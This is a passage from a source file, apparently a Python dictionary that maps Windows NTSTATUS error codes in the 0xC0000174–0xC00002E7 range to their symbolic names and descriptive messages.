		0xC0000174: ("STATUS_DEVICE_NOT_PARTITIONED","The tape partition information could not be found when loading a tape."),
		0xC0000175: ("STATUS_UNABLE_TO_LOCK_MEDIA","An attempt to lock the eject media mechanism failed."),
		0xC0000176: ("STATUS_UNABLE_TO_UNLOAD_MEDIA","An attempt to unload media failed."),
		0xC0000177: ("STATUS_EOM_OVERFLOW","The physical end of tape was detected."),
		0xC0000178: ("STATUS_NO_MEDIA","{No Media} There is no media in the drive. Insert media into drive %hs."),
		0xC000017A: ("STATUS_NO_SUCH_MEMBER","A member could not be added to or removed from the local group because the member does not exist."),
		0xC000017B: ("STATUS_INVALID_MEMBER","A new member could not be added to a local group because the member has the wrong account type."),
		0xC000017C: ("STATUS_KEY_DELETED","An illegal operation was attempted on a registry key that has been marked for deletion."),
		0xC000017D: ("STATUS_NO_LOG_SPACE","The system could not allocate the required space in a registry log."),
		0xC000017E: ("STATUS_TOO_MANY_SIDS","Too many SIDs have been specified."),
		0xC000017F: ("STATUS_LM_CROSS_ENCRYPTION_REQUIRED","An attempt was made to change a user password in the security account manager without providing the necessary LM cross-encrypted password."),
		0xC0000180: ("STATUS_KEY_HAS_CHILDREN","An attempt was made to create a symbolic link in a registry key that already has subkeys or values."),
		0xC0000181: ("STATUS_CHILD_MUST_BE_VOLATILE","An attempt was made to create a stable subkey under a volatile parent key."),
		0xC0000182: ("STATUS_DEVICE_CONFIGURATION_ERROR","The I/O device is configured incorrectly or the configuration parameters to the driver are incorrect."),
		0xC0000183: ("STATUS_DRIVER_INTERNAL_ERROR","An error was detected between two drivers or within an I/O driver."),
		0xC0000184: ("STATUS_INVALID_DEVICE_STATE","The device is not in a valid state to perform this request."),
		0xC0000185: ("STATUS_IO_DEVICE_ERROR","The I/O device reported an I/O error."),
		0xC0000186: ("STATUS_DEVICE_PROTOCOL_ERROR","A protocol error was detected between the driver and the device."),
		0xC0000187: ("STATUS_BACKUP_CONTROLLER","This operation is only allowed for the primary domain controller of the domain."),
		0xC0000188: ("STATUS_LOG_FILE_FULL","The log file space is insufficient to support this operation."),
		0xC0000189: ("STATUS_TOO_LATE","A write operation was attempted to a volume after it was dismounted."),
		0xC000018A: ("STATUS_NO_TRUST_LSA_SECRET","The workstation does not have a trust secret for the primary domain in the local LSA database."),
		0xC000018B: ("STATUS_NO_TRUST_SAM_ACCOUNT","The SAM database on the Windows Server does not have a computer account for this workstation trust relationship."),
		0xC000018C: ("STATUS_TRUSTED_DOMAIN_FAILURE","The logon request failed because the trust relationship between the primary domain and the trusted domain failed."),
		0xC000018D: ("STATUS_TRUSTED_RELATIONSHIP_FAILURE","The logon request failed because the trust relationship between this workstation and the primary domain failed."),
		0xC000018E: ("STATUS_EVENTLOG_FILE_CORRUPT","The Eventlog log file is corrupt."),
		0xC000018F: ("STATUS_EVENTLOG_CANT_START","No Eventlog log file could be opened. The Eventlog service did not start."),
		0xC0000190: ("STATUS_TRUST_FAILURE","The network logon failed. This may be because the validation authority cannot be reached."),
		0xC0000191: ("STATUS_MUTANT_LIMIT_EXCEEDED","An attempt was made to acquire a mutant such that its maximum count would have been exceeded."),
		0xC0000192: ("STATUS_NETLOGON_NOT_STARTED","An attempt was made to logon, but the NetLogon service was not started."),
		0xC0000193: ("STATUS_ACCOUNT_EXPIRED","The user account has expired."),
		0xC0000194: ("STATUS_POSSIBLE_DEADLOCK","{EXCEPTION} Possible deadlock condition."),
		0xC0000195: ("STATUS_NETWORK_CREDENTIAL_CONFLICT","Multiple connections to a server or shared resource by the same user, using more than one user name, are not allowed. Disconnect all previous connections to the server or shared resource and try again."),
		0xC0000196: ("STATUS_REMOTE_SESSION_LIMIT","An attempt was made to establish a session to a network server, but there are already too many sessions established to that server."),
		0xC0000197: ("STATUS_EVENTLOG_FILE_CHANGED","The log file has changed between reads."),
		0xC0000198: ("STATUS_NOLOGON_INTERDOMAIN_TRUST_ACCOUNT","The account used is an interdomain trust account. Use your global user account or local user account to access this server."),
		0xC0000199: ("STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT","The account used is a computer account. Use your global user account or local user account to access this server."),
		0xC000019A: ("STATUS_NOLOGON_SERVER_TRUST_ACCOUNT","The account used is a server trust account. Use your global user account or local user account to access this server."),
		0xC000019B: ("STATUS_DOMAIN_TRUST_INCONSISTENT","The name or SID of the specified domain is inconsistent with the trust information for that domain."),
		0xC000019C: ("STATUS_FS_DRIVER_REQUIRED","A volume has been accessed for which a file system driver is required that has not yet been loaded."),
		0xC000019D: ("STATUS_IMAGE_ALREADY_LOADED_AS_DLL","Indicates that the specified image is already loaded as a DLL."),
		0xC000019E: ("STATUS_INCOMPATIBLE_WITH_GLOBAL_SHORT_NAME_REGISTRY_SETTING","Short name settings may not be changed on this volume due to the global registry setting."),
		0xC000019F: ("STATUS_SHORT_NAMES_NOT_ENABLED_ON_VOLUME","Short names are not enabled on this volume."),
		0xC00001A0: ("STATUS_SECURITY_STREAM_IS_INCONSISTENT","The security stream for the given volume is in an inconsistent state. Please run CHKDSK on the volume."),
		0xC00001A1: ("STATUS_INVALID_LOCK_RANGE","A requested file lock operation cannot be processed due to an invalid byte range."),
		0xC00001A2: ("STATUS_INVALID_ACE_CONDITION","The specified access control entry (ACE) contains an invalid condition."),
		0xC00001A3: ("STATUS_IMAGE_SUBSYSTEM_NOT_PRESENT","The subsystem needed to support the image type is not present."),
		0xC00001A4: ("STATUS_NOTIFICATION_GUID_ALREADY_DEFINED","The specified file already has a notification GUID associated with it."),
		0xC0000201: ("STATUS_NETWORK_OPEN_RESTRICTION","A remote open failed because the network open restrictions were not satisfied."),
		0xC0000202: ("STATUS_NO_USER_SESSION_KEY","There is no user session key for the specified logon session."),
		0xC0000203: ("STATUS_USER_SESSION_DELETED","The remote user session has been deleted."),
		0xC0000204: ("STATUS_RESOURCE_LANG_NOT_FOUND","Indicates the specified resource language ID cannot be found in the image file."),
		0xC0000205: ("STATUS_INSUFF_SERVER_RESOURCES","Insufficient server resources exist to complete the request."),
		0xC0000206: ("STATUS_INVALID_BUFFER_SIZE","The size of the buffer is invalid for the specified operation."),
		0xC0000207: ("STATUS_INVALID_ADDRESS_COMPONENT","The transport rejected the specified network address as invalid."),
		0xC0000208: ("STATUS_INVALID_ADDRESS_WILDCARD","The transport rejected the specified network address due to invalid use of a wildcard."),
		0xC0000209: ("STATUS_TOO_MANY_ADDRESSES","The transport address could not be opened because all the available addresses are in use."),
		0xC000020A: ("STATUS_ADDRESS_ALREADY_EXISTS","The transport address could not be opened because it already exists."),
		0xC000020B: ("STATUS_ADDRESS_CLOSED","The transport address is now closed."),
		0xC000020C: ("STATUS_CONNECTION_DISCONNECTED","The transport connection is now disconnected."),
		0xC000020D: ("STATUS_CONNECTION_RESET","The transport connection has been reset."),
		0xC000020E: ("STATUS_TOO_MANY_NODES","The transport cannot dynamically acquire any more nodes."),
		0xC000020F: ("STATUS_TRANSACTION_ABORTED","The transport aborted a pending transaction."),
		0xC0000210: ("STATUS_TRANSACTION_TIMED_OUT","The transport timed out a request that is waiting for a response."),
		0xC0000211: ("STATUS_TRANSACTION_NO_RELEASE","The transport did not receive a release for a pending response."),
		0xC0000212: ("STATUS_TRANSACTION_NO_MATCH","The transport did not find a transaction that matches the specific token."),
		0xC0000213: ("STATUS_TRANSACTION_RESPONDED","The transport had previously responded to a transaction request."),
		0xC0000214: ("STATUS_TRANSACTION_INVALID_ID","The transport does not recognize the specified transaction request ID."),
		0xC0000215: ("STATUS_TRANSACTION_INVALID_TYPE","The transport does not recognize the specified transaction request type."),
		0xC0000216: ("STATUS_NOT_SERVER_SESSION","The transport can only process the specified request on the server side of a session."),
		0xC0000217: ("STATUS_NOT_CLIENT_SESSION","The transport can only process the specified request on the client side of a session."),
		0xC0000218: ("STATUS_CANNOT_LOAD_REGISTRY_FILE","{Registry File Failure} The registry cannot load the hive (file): %hs or its log or alternate. It is corrupt, absent, or not writable."),
		0xC0000219: ("STATUS_DEBUG_ATTACH_FAILED","{Unexpected Failure in DebugActiveProcess} An unexpected failure occurred while processing a DebugActiveProcess API request. You may choose OK to terminate the process, or Cancel to ignore the error."),
		0xC000021A: ("STATUS_SYSTEM_PROCESS_TERMINATED","{Fatal System Error} The %hs system process terminated unexpectedly with a status of 0x%08x (0x%08x 0x%08x). The system has been shut down."),
		0xC000021B: ("STATUS_DATA_NOT_ACCEPTED","{Data Not Accepted} The TDI client could not handle the data received during an indication."),
		0xC000021C: ("STATUS_NO_BROWSER_SERVERS_FOUND","{Unable to Retrieve Browser Server List} The list of servers for this workgroup is not currently available."),
		0xC000021D: ("STATUS_VDM_HARD_ERROR","NTVDM encountered a hard error."),
		0xC000021E: ("STATUS_DRIVER_CANCEL_TIMEOUT","{Cancel Timeout} The driver %hs failed to complete a canceled I/O request in the allotted time."),
		0xC000021F: ("STATUS_REPLY_MESSAGE_MISMATCH","{Reply Message Mismatch} An attempt was made to reply to an LPC message, but the thread specified by the client ID in the message was not waiting on that message."),
		0xC0000220: ("STATUS_MAPPED_ALIGNMENT","{Mapped View Alignment Incorrect} An attempt was made to map a view of a file, but either the specified base address or the offset into the file were not aligned on the proper allocation granularity."),
		0xC0000221: ("STATUS_IMAGE_CHECKSUM_MISMATCH","{Bad Image Checksum} The image %hs is possibly corrupt. The header checksum does not match the computed checksum."),
		0xC0000222: ("STATUS_LOST_WRITEBEHIND_DATA","{Delayed Write Failed} Windows was unable to save all the data for the file %hs. The data has been lost. This error may be caused by a failure of your computer hardware or network connection. Try to save this file elsewhere."),
		0xC0000223: ("STATUS_CLIENT_SERVER_PARAMETERS_INVALID","The parameters passed to the server in the client/server shared memory window were invalid. Too much data may have been put in the shared memory window."),
		0xC0000224: ("STATUS_PASSWORD_MUST_CHANGE","The user password must be changed before logging on the first time."),
		0xC0000225: ("STATUS_NOT_FOUND","The object was not found."),
		0xC0000226: ("STATUS_NOT_TINY_STREAM","The stream is not a tiny stream."),
		0xC0000227: ("STATUS_RECOVERY_FAILURE","A transaction recovery failed."),
		0xC0000228: ("STATUS_STACK_OVERFLOW_READ","The request must be handled by the stack overflow code."),
		0xC0000229: ("STATUS_FAIL_CHECK","A consistency check failed."),
		0xC000022A: ("STATUS_DUPLICATE_OBJECTID","The attempt to insert the ID in the index failed because the ID is already in the index."),
		0xC000022B: ("STATUS_OBJECTID_EXISTS","The attempt to set the object ID failed because the object already has an ID."),
		0xC000022C: ("STATUS_CONVERT_TO_LARGE","Internal OFS status codes indicating how an allocation operation is handled. Either it is retried after the containing oNode is moved or the extent stream is converted to a large stream."),
		0xC000022D: ("STATUS_RETRY","The request needs to be retried."),
		0xC000022E: ("STATUS_FOUND_OUT_OF_SCOPE","The attempt to find the object found an object on the volume that matches by ID; however, it is out of the scope of the handle that is used for the operation."),
		0xC000022F: ("STATUS_ALLOCATE_BUCKET","The bucket array must be grown. Retry the transaction after doing so."),
		0xC0000230: ("STATUS_PROPSET_NOT_FOUND","The specified property set does not exist on the object."),
		0xC0000231: ("STATUS_MARSHALL_OVERFLOW","The user/kernel marshaling buffer has overflowed."),
		0xC0000232: ("STATUS_INVALID_VARIANT","The supplied variant structure contains invalid data."),
		0xC0000233: ("STATUS_DOMAIN_CONTROLLER_NOT_FOUND","A domain controller for this domain was not found."),
		0xC0000234: ("STATUS_ACCOUNT_LOCKED_OUT","The user account has been automatically locked because too many invalid logon attempts or password change attempts have been requested."),
		0xC0000235: ("STATUS_HANDLE_NOT_CLOSABLE","NtClose was called on a handle that was protected from close via NtSetInformationObject."),
		0xC0000236: ("STATUS_CONNECTION_REFUSED","The transport-connection attempt was refused by the remote system."),
		0xC0000237: ("STATUS_GRACEFUL_DISCONNECT","The transport connection was gracefully closed."),
		0xC0000238: ("STATUS_ADDRESS_ALREADY_ASSOCIATED","The transport endpoint already has an address associated with it."),
		0xC0000239: ("STATUS_ADDRESS_NOT_ASSOCIATED","An address has not yet been associated with the transport endpoint."),
		0xC000023A: ("STATUS_CONNECTION_INVALID","An operation was attempted on a nonexistent transport connection."),
		0xC000023B: ("STATUS_CONNECTION_ACTIVE","An invalid operation was attempted on an active transport connection."),
		0xC000023C: ("STATUS_NETWORK_UNREACHABLE","The remote network is not reachable by the transport."),
		0xC000023D: ("STATUS_HOST_UNREACHABLE","The remote system is not reachable by the transport."),
		0xC000023E: ("STATUS_PROTOCOL_UNREACHABLE","The remote system does not support the transport protocol."),
		0xC000023F: ("STATUS_PORT_UNREACHABLE","No service is operating at the destination port of the transport on the remote system."),
		0xC0000240: ("STATUS_REQUEST_ABORTED","The request was aborted."),
		0xC0000241: ("STATUS_CONNECTION_ABORTED","The transport connection was aborted by the local system."),
		0xC0000242: ("STATUS_BAD_COMPRESSION_BUFFER","The specified buffer contains ill-formed data."),
		0xC0000243: ("STATUS_USER_MAPPED_FILE","The requested operation cannot be performed on a file with a user mapped section open."),
		0xC0000244: ("STATUS_AUDIT_FAILED","{Audit Failed} An attempt to generate a security audit failed."),
		0xC0000245: ("STATUS_TIMER_RESOLUTION_NOT_SET","The timer resolution was not previously set by the current process."),
		0xC0000246: ("STATUS_CONNECTION_COUNT_LIMIT","A connection to the server could not be made because the limit on the number of concurrent connections for this account has been reached."),
		0xC0000247: ("STATUS_LOGIN_TIME_RESTRICTION","Attempting to log on during an unauthorized time of day for this account."),
		0xC0000248: ("STATUS_LOGIN_WKSTA_RESTRICTION","The account is not authorized to log on from this station."),
		0xC0000249: ("STATUS_IMAGE_MP_UP_MISMATCH","{UP/MP Image Mismatch} The image %hs has been modified for use on a uniprocessor system, but you are running it on a multiprocessor machine. Reinstall the image file."),
		0xC0000250: ("STATUS_INSUFFICIENT_LOGON_INFO","There is insufficient account information to log you on."),
		0xC0000251: ("STATUS_BAD_DLL_ENTRYPOINT","{Invalid DLL Entrypoint} The dynamic link library %hs is not written correctly. The stack pointer has been left in an inconsistent state. The entry point should be declared as WINAPI or STDCALL. Select YES to fail the DLL load. Select NO to continue execution. Selecting NO may cause the application to operate incorrectly."),
		0xC0000252: ("STATUS_BAD_SERVICE_ENTRYPOINT","{Invalid Service Callback Entrypoint} The %hs service is not written correctly. The stack pointer has been left in an inconsistent state. The callback entry point should be declared as WINAPI or STDCALL. Selecting OK will cause the service to continue operation. However, the service process may operate incorrectly."),
		0xC0000253: ("STATUS_LPC_REPLY_LOST","The server received the messages but did not send a reply."),
		0xC0000254: ("STATUS_IP_ADDRESS_CONFLICT1","There is an IP address conflict with another system on the network."),
		0xC0000255: ("STATUS_IP_ADDRESS_CONFLICT2","There is an IP address conflict with another system on the network."),
		0xC0000256: ("STATUS_REGISTRY_QUOTA_LIMIT","{Low On Registry Space} The system has reached the maximum size that is allowed for the system part of the registry. Additional storage requests will be ignored."),
		0xC0000257: ("STATUS_PATH_NOT_COVERED","The contacted server does not support the indicated part of the DFS namespace."),
		0xC0000258: ("STATUS_NO_CALLBACK_ACTIVE","A callback return system service cannot be executed when no callback is active."),
		0xC0000259: ("STATUS_LICENSE_QUOTA_EXCEEDED","The service being accessed is licensed for a particular number of connections. No more connections can be made to the service at this time because the service has already accepted the maximum number of connections."),
		0xC000025A: ("STATUS_PWD_TOO_SHORT","The password provided is too short to meet the policy of your user account. Choose a longer password."),
		0xC000025B: ("STATUS_PWD_TOO_RECENT","The policy of your user account does not allow you to change passwords too frequently. This is done to prevent users from changing back to a familiar, but potentially discovered, password. If you feel your password has been compromised, contact your administrator immediately to have a new one assigned."),
		0xC000025C: ("STATUS_PWD_HISTORY_CONFLICT","You have attempted to change your password to one that you have used in the past. The policy of your user account does not allow this. Select a password that you have not previously used."),
		0xC000025E: ("STATUS_PLUGPLAY_NO_DEVICE","You have attempted to load a legacy device driver while its device instance had been disabled."),
		0xC000025F: ("STATUS_UNSUPPORTED_COMPRESSION","The specified compression format is unsupported."),
		0xC0000260: ("STATUS_INVALID_HW_PROFILE","The specified hardware profile configuration is invalid."),
		0xC0000261: ("STATUS_INVALID_PLUGPLAY_DEVICE_PATH","The specified Plug and Play registry device path is invalid."),
		0xC0000262: ("STATUS_DRIVER_ORDINAL_NOT_FOUND","{Driver Entry Point Not Found} The %hs device driver could not locate the ordinal %ld in driver %hs."),
		0xC0000263: ("STATUS_DRIVER_ENTRYPOINT_NOT_FOUND","{Driver Entry Point Not Found} The %hs device driver could not locate the entry point %hs in driver %hs."),
		0xC0000264: ("STATUS_RESOURCE_NOT_OWNED","{Application Error} The application attempted to release a resource it did not own. Click OK to terminate the application."),
		0xC0000265: ("STATUS_TOO_MANY_LINKS","An attempt was made to create more links on a file than the file system supports."),
		0xC0000266: ("STATUS_QUOTA_LIST_INCONSISTENT","The specified quota list is internally inconsistent with its descriptor."),
		0xC0000267: ("STATUS_FILE_IS_OFFLINE","The specified file has been relocated to offline storage."),
		0xC0000268: ("STATUS_EVALUATION_EXPIRATION","{Windows Evaluation Notification} The evaluation period for this installation of Windows has expired. This system will shutdown in 1 hour. To restore access to this installation of Windows, upgrade this installation by using a licensed distribution of this product."),
		0xC0000269: ("STATUS_ILLEGAL_DLL_RELOCATION","{Illegal System DLL Relocation} The system DLL %hs was relocated in memory. The application will not run properly. The relocation occurred because the DLL %hs occupied an address range that is reserved for Windows system DLLs. The vendor supplying the DLL should be contacted for a new DLL."),
		0xC000026A: ("STATUS_LICENSE_VIOLATION","{License Violation} The system has detected tampering with your registered product type. This is a violation of your software license. Tampering with the product type is not permitted."),
		0xC000026B: ("STATUS_DLL_INIT_FAILED_LOGOFF","{DLL Initialization Failed} The application failed to initialize because the window station is shutting down."),
		0xC000026C: ("STATUS_DRIVER_UNABLE_TO_LOAD","{Unable to Load Device Driver} %hs device driver could not be loaded. Error Status was 0x%x."),
		0xC000026D: ("STATUS_DFS_UNAVAILABLE","DFS is unavailable on the contacted server."),
		0xC000026E: ("STATUS_VOLUME_DISMOUNTED","An operation was attempted to a volume after it was dismounted."),
		0xC000026F: ("STATUS_WX86_INTERNAL_ERROR","An internal error occurred in the Win32 x86 emulation subsystem."),
		0xC0000270: ("STATUS_WX86_FLOAT_STACK_CHECK","Win32 x86 emulation subsystem floating-point stack check."),
		0xC0000271: ("STATUS_VALIDATE_CONTINUE","The validation process needs to continue on to the next step."),
		0xC0000272: ("STATUS_NO_MATCH","There was no match for the specified key in the index."),
		0xC0000273: ("STATUS_NO_MORE_MATCHES","There are no more matches for the current index enumeration."),
		0xC0000275: ("STATUS_NOT_A_REPARSE_POINT","The NTFS file or directory is not a reparse point."),
		0xC0000276: ("STATUS_IO_REPARSE_TAG_INVALID","The Windows I/O reparse tag passed for the NTFS reparse point is invalid."),
		0xC0000277: ("STATUS_IO_REPARSE_TAG_MISMATCH","The Windows I/O reparse tag does not match the one that is in the NTFS reparse point."),
		0xC0000278: ("STATUS_IO_REPARSE_DATA_INVALID","The user data passed for the NTFS reparse point is invalid."),
		0xC0000279: ("STATUS_IO_REPARSE_TAG_NOT_HANDLED","The layered file system driver for this I/O tag did not handle it when needed."),
		0xC0000280: ("STATUS_REPARSE_POINT_NOT_RESOLVED","The NTFS symbolic link could not be resolved even though the initial file name is valid."),
		0xC0000281: ("STATUS_DIRECTORY_IS_A_REPARSE_POINT","The NTFS directory is a reparse point."),
		0xC0000282: ("STATUS_RANGE_LIST_CONFLICT","The range could not be added to the range list because of a conflict."),
		0xC0000283: ("STATUS_SOURCE_ELEMENT_EMPTY","The specified medium changer source element contains no media."),
		0xC0000284: ("STATUS_DESTINATION_ELEMENT_FULL","The specified medium changer destination element already contains media."),
		0xC0000285: ("STATUS_ILLEGAL_ELEMENT_ADDRESS","The specified medium changer element does not exist."),
		0xC0000286: ("STATUS_MAGAZINE_NOT_PRESENT","The specified element is contained in a magazine that is no longer present."),
		0xC0000287: ("STATUS_REINITIALIZATION_NEEDED","The device requires re-initialization due to hardware errors."),
		0xC000028A: ("STATUS_ENCRYPTION_FAILED","The file encryption attempt failed."),
		0xC000028B: ("STATUS_DECRYPTION_FAILED","The file decryption attempt failed."),
		0xC000028C: ("STATUS_RANGE_NOT_FOUND","The specified range could not be found in the range list."),
		0xC000028D: ("STATUS_NO_RECOVERY_POLICY","There is no encryption recovery policy configured for this system."),
		0xC000028E: ("STATUS_NO_EFS","The required encryption driver is not loaded for this system."),
		0xC000028F: ("STATUS_WRONG_EFS","The file was encrypted with a different encryption driver than is currently loaded."),
		0xC0000290: ("STATUS_NO_USER_KEYS","There are no EFS keys defined for the user."),
		0xC0000291: ("STATUS_FILE_NOT_ENCRYPTED","The specified file is not encrypted."),
		0xC0000292: ("STATUS_NOT_EXPORT_FORMAT","The specified file is not in the defined EFS export format."),
		0xC0000293: ("STATUS_FILE_ENCRYPTED","The specified file is encrypted and the user does not have the ability to decrypt it."),
		0xC0000295: ("STATUS_WMI_GUID_NOT_FOUND","The GUID passed was not recognized as valid by a WMI data provider."),
		0xC0000296: ("STATUS_WMI_INSTANCE_NOT_FOUND","The instance name passed was not recognized as valid by a WMI data provider."),
		0xC0000297: ("STATUS_WMI_ITEMID_NOT_FOUND","The data item ID passed was not recognized as valid by a WMI data provider."),
		0xC0000298: ("STATUS_WMI_TRY_AGAIN","The WMI request could not be completed and should be retried."),
		0xC0000299: ("STATUS_SHARED_POLICY","The policy object is shared and can only be modified at the root."),
		0xC000029A: ("STATUS_POLICY_OBJECT_NOT_FOUND","The policy object does not exist when it should."),
		0xC000029B: ("STATUS_POLICY_ONLY_IN_DS","The requested policy information only lives in the Ds."),
		0xC000029C: ("STATUS_VOLUME_NOT_UPGRADED","The volume must be upgraded to enable this feature."),
		0xC000029D: ("STATUS_REMOTE_STORAGE_NOT_ACTIVE","The remote storage service is not operational at this time."),
		0xC000029E: ("STATUS_REMOTE_STORAGE_MEDIA_ERROR","The remote storage service encountered a media error."),
		0xC000029F: ("STATUS_NO_TRACKING_SERVICE","The tracking (workstation) service is not running."),
		0xC00002A0: ("STATUS_SERVER_SID_MISMATCH","The server process is running under a SID that is different from the SID that is required by client."),
		0xC00002A1: ("STATUS_DS_NO_ATTRIBUTE_OR_VALUE","The specified directory service attribute or value does not exist."),
		0xC00002A2: ("STATUS_DS_INVALID_ATTRIBUTE_SYNTAX","The attribute syntax specified to the directory service is invalid."),
		0xC00002A3: ("STATUS_DS_ATTRIBUTE_TYPE_UNDEFINED","The attribute type specified to the directory service is not defined."),
		0xC00002A4: ("STATUS_DS_ATTRIBUTE_OR_VALUE_EXISTS","The specified directory service attribute or value already exists."),
		0xC00002A5: ("STATUS_DS_BUSY","The directory service is busy."),
		0xC00002A6: ("STATUS_DS_UNAVAILABLE","The directory service is unavailable."),
		0xC00002A7: ("STATUS_DS_NO_RIDS_ALLOCATED","The directory service was unable to allocate a relative identifier."),
		0xC00002A8: ("STATUS_DS_NO_MORE_RIDS","The directory service has exhausted the pool of relative identifiers."),
		0xC00002A9: ("STATUS_DS_INCORRECT_ROLE_OWNER","The requested operation could not be performed because the directory service is not the master for that type of operation."),
		0xC00002AA: ("STATUS_DS_RIDMGR_INIT_ERROR","The directory service was unable to initialize the subsystem that allocates relative identifiers."),
		0xC00002AB: ("STATUS_DS_OBJ_CLASS_VIOLATION","The requested operation did not satisfy one or more constraints that are associated with the class of the object."),
		0xC00002AC: ("STATUS_DS_CANT_ON_NON_LEAF","The directory service can perform the requested operation only on a leaf object."),
		0xC00002AD: ("STATUS_DS_CANT_ON_RDN","The directory service cannot perform the requested operation on the Relatively Defined Name (RDN) attribute of an object."),
		0xC00002AE: ("STATUS_DS_CANT_MOD_OBJ_CLASS","The directory service detected an attempt to modify the object class of an object."),
		0xC00002AF: ("STATUS_DS_CROSS_DOM_MOVE_FAILED","An error occurred while performing a cross domain move operation."),
		0xC00002B0: ("STATUS_DS_GC_NOT_AVAILABLE","Unable to contact the global catalog server."),
		0xC00002B1: ("STATUS_DIRECTORY_SERVICE_REQUIRED","The requested operation requires a directory service, and none was available."),
		0xC00002B2: ("STATUS_REPARSE_ATTRIBUTE_CONFLICT","The reparse attribute cannot be set because it is incompatible with an existing attribute."),
		0xC00002B3: ("STATUS_CANT_ENABLE_DENY_ONLY","A group marked \"use for deny only\" cannot be enabled."),
		0xC00002B4: ("STATUS_FLOAT_MULTIPLE_FAULTS","{EXCEPTION} Multiple floating-point faults."),
		0xC00002B5: ("STATUS_FLOAT_MULTIPLE_TRAPS","{EXCEPTION} Multiple floating-point traps."),
		0xC00002B6: ("STATUS_DEVICE_REMOVED","The device has been removed."),
		0xC00002B7: ("STATUS_JOURNAL_DELETE_IN_PROGRESS","The volume change journal is being deleted."),
		0xC00002B8: ("STATUS_JOURNAL_NOT_ACTIVE","The volume change journal is not active."),
		0xC00002B9: ("STATUS_NOINTERFACE","The requested interface is not supported."),
		0xC00002C1: ("STATUS_DS_ADMIN_LIMIT_EXCEEDED","A directory service resource limit has been exceeded."),
		0xC00002C2: ("STATUS_DRIVER_FAILED_SLEEP","{System Standby Failed} The driver %hs does not support standby mode. Updating this driver may allow the system to go to standby mode."),
		0xC00002C3: ("STATUS_MUTUAL_AUTHENTICATION_FAILED","Mutual Authentication failed. The server password is out of date at the domain controller."),
		0xC00002C4: ("STATUS_CORRUPT_SYSTEM_FILE","The system file %1 has become corrupt and has been replaced."),
		0xC00002C5: ("STATUS_DATATYPE_MISALIGNMENT_ERROR","{EXCEPTION} Alignment Error A data type misalignment error was detected in a load or store instruction."),
		0xC00002C6: ("STATUS_WMI_READ_ONLY","The WMI data item or data block is read-only."),
		0xC00002C7: ("STATUS_WMI_SET_FAILURE","The WMI data item or data block could not be changed."),
		0xC00002C8: ("STATUS_COMMITMENT_MINIMUM","{Virtual Memory Minimum Too Low} Your system is low on virtual memory. Windows is increasing the size of your virtual memory paging file. During this process, memory requests for some applications may be denied. For more information, see Help."),
		0xC00002C9: ("STATUS_REG_NAT_CONSUMPTION","{EXCEPTION} Register NaT consumption faults. A NaT value is consumed on a non-speculative instruction."),
		0xC00002CA: ("STATUS_TRANSPORT_FULL","The transport element of the medium changer contains media, which is causing the operation to fail."),
		0xC00002CB: ("STATUS_DS_SAM_INIT_FAILURE","Security Accounts Manager initialization failed because of the following error: %hs Error Status: 0x%x. Click OK to shut down this system and restart in Directory Services Restore Mode. Check the event log for more detailed information."),
		0xC00002CC: ("STATUS_ONLY_IF_CONNECTED","This operation is supported only when you are connected to the server."),
		0xC00002CD: ("STATUS_DS_SENSITIVE_GROUP_VIOLATION","Only an administrator can modify the membership list of an administrative group."),
		0xC00002CE: ("STATUS_PNP_RESTART_ENUMERATION","A device was removed so enumeration must be restarted."),
		0xC00002CF: ("STATUS_JOURNAL_ENTRY_DELETED","The journal entry has been deleted from the journal."),
		0xC00002D0: ("STATUS_DS_CANT_MOD_PRIMARYGROUPID","Cannot change the primary group ID of a domain controller account."),
		0xC00002D1: ("STATUS_SYSTEM_IMAGE_BAD_SIGNATURE","{Fatal System Error} The system image %s is not properly signed. The file has been replaced with the signed file. The system has been shut down."),
		0xC00002D2: ("STATUS_PNP_REBOOT_REQUIRED","The device will not start without a reboot."),
		0xC00002D3: ("STATUS_POWER_STATE_INVALID","The power state of the current device cannot support this request."),
		0xC00002D4: ("STATUS_DS_INVALID_GROUP_TYPE","The specified group type is invalid."),
		0xC00002D5: ("STATUS_DS_NO_NEST_GLOBALGROUP_IN_MIXEDDOMAIN","In a mixed domain, no nesting of a global group if the group is security enabled."),
		0xC00002D6: ("STATUS_DS_NO_NEST_LOCALGROUP_IN_MIXEDDOMAIN","In a mixed domain, cannot nest local groups with other local groups, if the group is security enabled."),
		0xC00002D7: ("STATUS_DS_GLOBAL_CANT_HAVE_LOCAL_MEMBER","A global group cannot have a local group as a member."),
		0xC00002D8: ("STATUS_DS_GLOBAL_CANT_HAVE_UNIVERSAL_MEMBER","A global group cannot have a universal group as a member."),
		0xC00002D9: ("STATUS_DS_UNIVERSAL_CANT_HAVE_LOCAL_MEMBER","A universal group cannot have a local group as a member."),
		0xC00002DA: ("STATUS_DS_GLOBAL_CANT_HAVE_CROSSDOMAIN_MEMBER","A global group cannot have a cross-domain member."),
		0xC00002DB: ("STATUS_DS_LOCAL_CANT_HAVE_CROSSDOMAIN_LOCAL_MEMBER","A local group cannot have another cross-domain local group as a member."),
		0xC00002DC: ("STATUS_DS_HAVE_PRIMARY_MEMBERS","Cannot change to a security-disabled group because primary members are in this group."),
		0xC00002DD: ("STATUS_WMI_NOT_SUPPORTED","The WMI operation is not supported by the data block or method."),
		0xC00002DE: ("STATUS_INSUFFICIENT_POWER","There is not enough power to complete the requested operation."),
		0xC00002DF: ("STATUS_SAM_NEED_BOOTKEY_PASSWORD","The Security Accounts Manager needs to get the boot password."),
		0xC00002E0: ("STATUS_SAM_NEED_BOOTKEY_FLOPPY","The Security Accounts Manager needs to get the boot key from the floppy disk."),
		0xC00002E1: ("STATUS_DS_CANT_START","The directory service cannot start."),
		0xC00002E2: ("STATUS_DS_INIT_FAILURE","The directory service could not start because of the following error: %hs Error Status: 0x%x. Click OK to shut down this system and restart in Directory Services Restore Mode. Check the event log for more detailed information."),
		0xC00002E3: ("STATUS_SAM_INIT_FAILURE","The Security Accounts Manager initialization failed because of the following error: %hs Error Status: 0x%x. Click OK to shut down this system and restart in Safe Mode. Check the event log for more detailed information."),
		0xC00002E4: ("STATUS_DS_GC_REQUIRED","The requested operation can be performed only on a global catalog server."),
		0xC00002E5: ("STATUS_DS_LOCAL_MEMBER_OF_LOCAL_ONLY","A local group can only be a member of other local groups in the same domain."),
		0xC00002E6: ("STATUS_DS_NO_FPO_IN_UNIVERSAL_GROUPS","Foreign security principals cannot be members of universal groups."),
		0xC00002E7: ("STATUS_DS_MACHINE_ACCOUNT_QUOTA_EXCEEDED","Your computer could not be joined to the domain. You have exceeded the maximum number of computer accounts you are allowed to create in this domain. Contact your system administrator to have this limit reset or increased."),
